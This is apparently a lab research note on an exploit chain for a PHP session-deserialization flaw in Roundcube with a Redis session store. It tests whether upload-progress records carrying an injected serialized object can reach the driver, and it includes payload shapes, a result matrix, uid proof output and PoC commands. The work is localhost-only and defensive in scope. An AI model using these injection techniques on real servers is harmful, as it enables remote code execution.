# Roundcube 1.6.11 + Redis — does the stock driver read the upload-progress record?

**LAB-ONLY.** Targets `127.0.0.1` only; fixed benign command
`id>/tmp/vd 2>&1`. Status: 2026-10-31. Track B (application gadget),
precondition experiment for CVE-2026-115560. Evidence level: **executed**
(lab HTTP + Redis introspection), not a chain proof.

## Question

`docs/NEXT_TRACKS_APP_CHAINS.md` §4.1 ranked this as the cheapest high-value
test: with server `session.save_handler=redis` + `session.serialize_handler=
php_serialize` and Roundcube `session_storage='redis'`, stock
`rcube_session_redis::__construct()` calls `register_session_handler()`
(`session/redis.php:58`), which runs
`ini_set('session.serialize_handler','php')` (`rcube_session.php:116`). If the
driver also reads the key the rfc1867 upload-progress hook wrote, then the lab
plugin's runtime switch is no longer needed.

**Verdict: the switch precondition is removed, but the store is not.** Stock
Roundcube performs the switch and decodes when the Redis value is in its own
envelope; the upload-progress record is not in that envelope. The plugin is
still required — now as a *store adapter*, not as a switch.

## Lab

`lab-roundcube-redis/` (new, `setup.sh` rebuilds):

- `php:8.4.27-apache` + **phpredis 6.3.0** (`pecl install redis-6.3.0`) — the
  official image has no Redis session handler.
- `redis:7-alpine`, `--save "" --appendonly no`; host inspection on `:16379`.
- `:18320` Roundcube `session_storage='redis'`, `redis_hosts=['redis:6379']`.
- `:18321` Roundcube `session_storage='php'` with the **same** server store
  (isolation control: native handler, no wrapper).
- Roundcube tree, `vd115560` plugin, single prefork child and the gadget
  classes are reused unchanged from `lab-roundcube/`.
- Server ini: `session.save_handler=redis`,
  `session.save_path="tcp://redis:6379?prefix="`, `serialize_handler=
  php_serialize`, `upload_progress=On`, `cleanup=Off`, locking off.
  PHP reports `Off` as the empty string; the probe prints
  `ini upload_progress.cleanup (empty string == Off): ''`.

Driver: `poc/verify_roundcube_redis.py` (`probe | flow | matrix | switch`).

## Measured facts

### 1. The hook writes the record through the Redis handler

`probe` mode, one multipart POST to `/prime_redis.php` (no `session_start`) on
`:18320`:

```text
keys: ['rcprobe8427abc']
writer_key_is_raw_sid: True
value_head: a:1:{s:36:"upload_progress_|O:8:"VdSimple":0:{}";a:5:{s:10:"start_time
save_path: tcp://redis:6379?prefix=
```

The record is the same `php_serialize` shape as the file lab: the attacker's
`|` lives inside the session key `upload_progress_|O:8:...`.

### 2. Key namespace: default mismatch, configurable alignment

phpredis defaults to `PHPREDIS_SESSION:<sid>`
(`REDIS_SESSION_PREFIX` in `redis_session.c`); there is no
`redis.session.key_prefix` ini. But `session.save_path` accepts a `prefix`
query parameter (`REDIS_CONF_STRING_STATIC(ht, "prefix", &prefix)`, used by
`redis_session_key()`); an **empty** value removes the namespace. With
`?prefix=` the only key is the raw session id — exactly the key
`rcube_session_redis::read()` uses (`redis.php:122`, `$this->redis->get($key)`).

### 3. Keys aligned is still not enough — the envelope blocks

`flow` mode, real request, no seeding, plugin switch disabled:

```text
real flow (keys aligned)           dtor=no  plugin_switch_off=True proof=none
keys: ['rcflow8427abc']
stored_head: a:3:{s:7:"changed";i:1793409733;s:2:"ip";N;s:4:"vars";s:483:"temp|b:1;language|s:5:"en_US"
ttl: 660
```

`rcube_session_redis::read()` does `$arr = unserialize($value)` (`redis.php:133`)
and takes `$arr['vars']` (`:136`). The hook's value is
`a:1:{s:36:"upload_progress_|...";a:5:{...}}` — a valid serialized array with
no `vars` key. `read()` returns `''`, so PHP's `php` decoder never sees the
record's `|` payload.

With the keys aligned, the app's own shutdown write also **overwrites** the
hook's record at the same key. Receipt (`flow` mode):

```text
stored_head: a:3:{s:7:"changed";i:1793409733;s:2:"ip";N;s:4:"vars";s:483:"temp|b:1;language|s:5:"en_US"
ttl: 660
```

So a concurrent consumer under `cleanup=On` would read the wrapper too, not
the record (inference from the stored shape; the race itself was not re-run in
Redis).

### 4. 2×2 isolation (plugin switch disabled throughout)

| key the request reads | value = phpredis `php_serialize` blob | value = rcube `a:3:{changed,ip,vars}` |
|---|---|---|
| raw sid | **no dtor** (`raw sid + phpredis blob`) | **dtor, `uid=33(www-data)`** |
| `PHPREDIS_SESSION:<sid>` | no dtor | no dtor |

```text
key \ envelope                     raw blob (phpredis)            rcube wrapper
raw sid + phpredis blob            dtor=no  plugin_switch_off=True proof=none
raw sid + rcube wrapper            dtor=YES plugin_switch_off=True proof=uid=33(www-data) ...
prefixed + phpredis blob           dtor=no  plugin_switch_off=True proof=none
prefixed + rcube wrapper           dtor=no  plugin_switch_off=True proof=none
```

The only firing cell has **both** alignments *and* the plugin log shows
`handler-switch-DISABLED` before `simple-dtor`: the `php` switch was executed
by stock `rcube_session_redis::register_session_handler()`, not by the plugin.
So the switch site is real and reachable; the driver's read envelope is the
actual blocker.

## Isolation control: the Redis store is not the blocker

`:18321` = `session_storage='php'` (native driver, `session/php.php:39-40`
are no-ops) against the same Redis server store:

```text
# plugin switch ON
handler-switched handler=php
simple-dtor
proof='uid=33(www-data) gid=33(www-data) groups=33(www-data)'

# plugin switch DISABLED
handler-switch-DISABLED handler=php_serialize
(no dtor, proof='')
```

So with Redis as the server store the plugin profile ports unchanged and the
plugin switch is load-bearing. With `session_storage='redis'` the stock switch
runs but the wrapper cannot be produced by the upload hook.

## Controls

| control | result |
|---|---|
| plugin switch disabled (`/tmp/rc-vd-noswitch`) | no dtor / no proof in all redis-storage rows and on `:18321` |
| gadget classes disabled (`/tmp/rc-vd-nogadget`) | wrapper at raw key → no dtor / no proof |
| plugin switch enabled, wrapper at raw key | dtor + `uid=33` (lab profile regression) |
| prefixed key (writer default) | no dtor, with either envelope |
| record inspected directly in Redis | `upload_progress_` bytes present (hook did write) |

## What would remove the plugin

The record would have to be readable as `vars` by
`rcube_session_redis::read()`. That requires the value at the read key to be
`serialize(['changed'=>..., 'ip'=>..., 'vars'=> <php-handler blob>])`. The
rfc1867 hook cannot write that shape: it serializes `$_SESSION` as
`[prefix.name => progress_array]`, and the progress array is PHP-built
(strings/ints only). Reaching the wrapper requires write access to the Redis
key or an app code path that stores attacker-controlled session vars — neither
is pre-auth. The alternative is `session_storage='php'` (native Redis handler),
which needs the plugin switch exactly as the file profile does.

## Ceiling

- One build (`php:8.4.27-apache`), native arm64, single prefork child.
- `cleanup=Off` direct profile; the `cleanup=On` race is proven separately
  (`docs/RACE_WAKEUP_115560.md`) and was not re-run in Redis.
- php Serialize is still `php_serialize` from the server; a default install
  (`serialize_handler=php`) has no mismatch to exploit at all.
- phpredis 6.3.0 only; the `prefix` save-path parameter is version-specific.
- The gadget is a lab plugin; the survey found no stock Roundcube re-entry
  destructor. This experiment only addresses the **switch/store** precondition.
- No terminal/address work here; no claim about ASLR, workers, or portability.

## Exact commands

```bash
cd lab-roundcube-redis && ./setup.sh && cd ..

python3 poc/verify_roundcube_redis.py probe
python3 poc/verify_roundcube_redis.py flow
python3 poc/verify_roundcube_redis.py matrix
python3 poc/verify_roundcube_redis.py switch

python3 poc/verify_115560_roundcube.py \
  --target 127.0.0.1:18321 --container php2shell-rc-redis-php --build 8.4.27 simple
```

## Evidence files

- `lab-roundcube-redis/evidence/redis-8427.log` — probe, flow, 2×2 matrix,
  `session_storage='php'` positive/negative, nogadget control.
- Source refs: `session/redis.php:58,117-141`; `rcube_session.php:109-121`;
  `rcube.php:446-449`; `session/php.php:39-40`;
  phpredis `redis_session.c` (`REDIS_SESSION_PREFIX`, `prefix` query param).
